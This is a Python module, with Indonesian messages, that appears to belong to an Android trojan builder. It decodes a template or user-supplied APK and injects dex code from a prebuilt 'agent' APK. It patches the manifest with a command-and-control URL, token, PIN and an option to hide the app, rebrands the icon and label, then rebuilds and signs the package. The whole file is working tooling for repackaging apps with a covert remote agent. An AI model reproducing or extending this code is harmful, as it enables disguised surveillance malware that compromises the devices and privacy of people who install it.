"""Pipeline build & patch APK."""
from __future__ import annotations

import asyncio
import hashlib
import re
import secrets
import shutil
import subprocess
import tempfile
import time
import uuid
import zipfile
from pathlib import Path
from typing import Callable

from . import branding, config, db, injector, signer

Log = Callable[[str], None]

AGENT_APK = "agent.apk"
TEMPLATE_APK = "template.apk"


def _apktool() -> str:
    tool = shutil.which("apktool")
    if tool is None:
        raise RuntimeError("apktool tidak ditemukan. Jalankan ./install.sh")
    return tool


def _run(args: list[str], cwd: Path | None = None, timeout: int = 1800) -> None:
    proc = subprocess.run(args, cwd=cwd, capture_output=True, timeout=timeout)
    if proc.returncode != 0:
        tail = (proc.stderr or proc.stdout or b"")[-1500:].decode(errors="replace")
        raise RuntimeError(f"{Path(args[0]).name} gagal: {tail}")


def prebuilt(name: str) -> Path:
    path = config.PREBUILT_DIR / name
    if not path.exists():
        raise RuntimeError(
            f"agent/prebuilt/{name} tidak ada. Jalankan ./scripts/build-agent.sh"
        )
    return path


def new_token() -> str:
    return secrets.token_urlsafe(24)


def decode(apk: Path, work: Path, log: Log) -> Path:
    decoded = work / "decoded"
    log("apktool decode...")
    _run([_apktool(), "d", "-f", "-o", str(decoded), str(apk)])
    if not (decoded / "AndroidManifest.xml").exists():
        raise RuntimeError("hasil decode tanpa AndroidManifest.xml")
    return decoded


def build_decoded(decoded: Path, work: Path, log: Log) -> Path:
    unsigned = work / "unsigned.apk"
    log("apktool build...")
    _run([_apktool(), "b", str(decoded), "-o", str(unsigned)])
    if not unsigned.exists():
        raise RuntimeError("apktool tidak menghasilkan APK")
    return unsigned


def finalize(unsigned: Path, out: Path, log: Log) -> Path:
    aligned = out.with_suffix(".aligned.apk")
    log("zipalign...")
    signer.zipalign(unsigned, aligned)
    log("signing...")
    signer.sign(aligned)
    shutil.move(str(aligned), str(out))
    return out


def sha256(path: Path) -> str:
    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def _prepare(decoded: Path, opts: dict) -> int:
    """Injeksi dex + resource + manifest. Kembalikan jumlah dex."""
    has_icon = bool(opts.get("icon"))
    has_label = bool(opts.get("label"))

    n = injector.inject_dex(decoded, prebuilt(AGENT_APK))
    injector.inject_assets(decoded)

    if has_icon:
        branding.write_icons(Path(opts["icon"]).read_bytes(), decoded / "res")
    if opts.get("wallpaper"):
        branding.write_wallpaper(Path(opts["wallpaper"]).read_bytes(), decoded / "res")
    if has_label:
        branding.patch_strings(
            decoded / "res" / "values" / "mzk_strings.xml",
            opts["label"], opts.get("wizard", ""), opts["email"], opts["team"],
        )

    injector.patch_manifest(
        decoded,
        opts["c2_url"], opts["token"], opts["pin"],
        opts["email"], opts["team"], bool(opts.get("hide")),
        has_label, has_icon,
    )
    return n


async def run_job(build_id: str, mode: str, source: Path | None, opts: dict) -> None:
    """Jalankan job build di thread terpisah."""
    loop = asyncio.get_running_loop()

    def log(line: str) -> None:
        stamp = time.strftime("%H:%M:%S")
        row = db.one("SELECT log FROM builds WHERE id=?", (build_id,))
        prev = (row["log"] if row else "") or ""
        merged = (prev + f"[{stamp}] {line}\n")[-20000:]
        db.x("UPDATE builds SET log=?,updated=? WHERE id=?", (merged, time.time(), build_id))

    db.x("UPDATE builds SET status='proses',updated=? WHERE id=?", (time.time(), build_id))
    work = config.BUILD_DIR / build_id
    work.mkdir(parents=True, exist_ok=True)
    out = config.BUILD_DIR / f"{build_id}.apk"

    try:
        if mode == "patch":
            if source is None:
                raise RuntimeError("mode patch tanpa file sumber")
            decoded = await loop.run_in_executor(None, decode, source, work, log)
        else:
            base = prebuilt(TEMPLATE_APK)
            copy = work / TEMPLATE_APK
            shutil.copy2(base, copy)
            decoded = await loop.run_in_executor(None, decode, copy, work, log)

        log("inject dex agent...")
        count = await loop.run_in_executor(None, _prepare, decoded, opts)
        log(f"{count} dex disisipkan, manifest dipatch")

        unsigned = await loop.run_in_executor(None, build_decoded, decoded, work, log)
        await loop.run_in_executor(None, finalize, unsigned, out, log)

        size = out.stat().st_size
        db.x("UPDATE builds SET status='selesai',outfile=?,size=?,updated=? WHERE id=?",
             (str(out), size, time.time(), build_id))
        log(f"SELESAI · {size / 1048576:.2f} MB · sha256 {sha256(out)[:16]}…")
        shutil.rmtree(work, ignore_errors=True)
    except Exception as exc:  # noqa: BLE001
        db.x("UPDATE builds SET status='gagal',updated=? WHERE id=?", (time.time(), build_id))
        log(f"GAGAL: {exc}")
    finally:
        if source is not None and source.exists():
            source.unlink(missing_ok=True)


def create_build(name: str, package: str, mode: str, source: Path | None, opts: dict) -> str:
    build_id = uuid.uuid4().hex[:12]
    now = time.time()
    db.x(
        "INSERT INTO builds(id,name,package,mode,status,log,created,updated)"
        " VALUES(?,?,?,?,'antri','',?,?)",
        (build_id, name, package, mode, now, now),
    )
    return build_id


def inspect_apk(path: Path) -> dict:
    """Baca package/versi dari APK tanpa decode penuh."""
    info = {"package": "", "version": "", "valid": False}
    try:
        with zipfile.ZipFile(path) as z:
            if "AndroidManifest.xml" not in z.namelist():
                return info
            info["valid"] = True
    except zipfile.BadZipFile:
        return info

    tmp = Path(tempfile.mkdtemp(prefix="mzk_inspect_"))
    try:
        proc = subprocess.run(
            [_apktool(), "d", "-s", "-f", "-o", str(tmp / "d"), str(path)],
            capture_output=True, timeout=240,
        )
        if proc.returncode == 0:
            mf = (tmp / "d" / "AndroidManifest.xml").read_text(errors="replace")
            m = re.search(r'package="([^"]+)"', mf)
            v = re.search(r'versionName="([^"]*)"', mf)
            info["package"] = m.group(1) if m else ""
            info["version"] = v.group(1) if v else ""
    except (subprocess.SubprocessError, OSError):
        pass
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    return info
